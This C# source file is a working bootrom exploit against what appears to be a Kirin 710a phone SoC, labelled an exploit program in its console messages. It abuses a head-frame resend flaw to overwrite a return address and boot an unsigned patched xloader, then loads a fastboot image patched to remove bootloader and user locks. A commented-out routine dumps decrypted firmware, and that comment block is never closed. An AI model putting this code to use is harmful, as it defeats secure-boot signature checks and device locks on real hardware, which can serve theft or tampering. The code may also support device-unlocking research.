using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using Potato.ImageFlasher;
using Potato.Fastboot;
using System.Security.Cryptography;
using System.IO;
using System.Linq;
using Microsoft.VisualBasic;
using System.ComponentModel;
using System.Runtime.Intrinsics.Arm;

namespace myidt1
{
    internal class Program
    {
        
        static void Main(string[] args)
        {
            
            var dat=BitConverter.GetBytes(0x23155);
            //This is the xloader start  address(stored in 0x23018 where xloader image starts at 0x22000)
            // for old socs,it may be 0x23001
            //because of thumb code,you need to add 1 to your real address(0x23154+1)

            
            var fl = new ImageFlasher();
            Console.WriteLine("-----漏洞利用程序启动-----");
            fl.Open("COM12");//your port name
          
              fl.SendHeadFrame(0, 0x22000);//xloader load address(not the real start address)
            //first,sent a invalid xloader(all zero) to initialize usb and emmc.
              fl.SendTailFrame(1);
              
              Console.WriteLine("------ExPLoit Start，Send patched xloader----");
            Console.ReadKey(true);
            //fl.SendTailFrame(2);
            // 49ba8 49bc8 49bc0 49ba0
            fl.Write("C:\\xloader_710a_patched3.img", 0x22000,0, x => Console.WriteLine($"Progress:{x}%"));
            //upload unsigned patched xloader image without sending tail command

   
              fl.SendHeadFrame(4, 0x22000);//using head resend exploit,send right address
              fl.SendHeadFrame(4, 0x49BC8);//send target address ,but the state machine does not change,
            //target address is the return address of download_xloader function

              fl.SendDataFrame(1, dat);//send xloader start address to jump to xloader
              fl.SendTailFrame(2);//send tail command to end bootrom
             
              Console.WriteLine("------发送UCE----");
            Console.ReadKey(true);
            fl.Write("C:\\uce.img", 0x6000D000, 1, x => Console.WriteLine($"Progress:{x}%"));
            //send uce
            
            Console.WriteLine("------发送patched fastboot----");
            Console.ReadKey(true);
            fl.Write("C:\\fastboot_710a_dec_patched3.img", 0x1C000000, 1, x => Console.WriteLine($"Progress:{x}%"));
            //send decrypted fastboot(patch fblock userlock dtsinit)
            //send fastboot
            /*Console.ReadKey(true);
            Console.WriteLine("------Decrypt fastboot----");
            //need to send origin fastboot with xloader_710a_patched2.img
            var stream = new FileStream("D:\\fastboot_710a_dec.img", FileMode.Append, FileAccess.Write);
            var buffer = new byte[0x400];
            
            for (var i= 0x1C000000; i< 0x1C475800; i += 0x400)
            {
                fl.SendInquiryPatched(2, i);
                fl.port.Read(buffer, 0, 0x400);
                stream.Write(buffer, 0, 0x400);
                
;            }
            stream.Close();
            fl.Close();
            
        }

    }
}
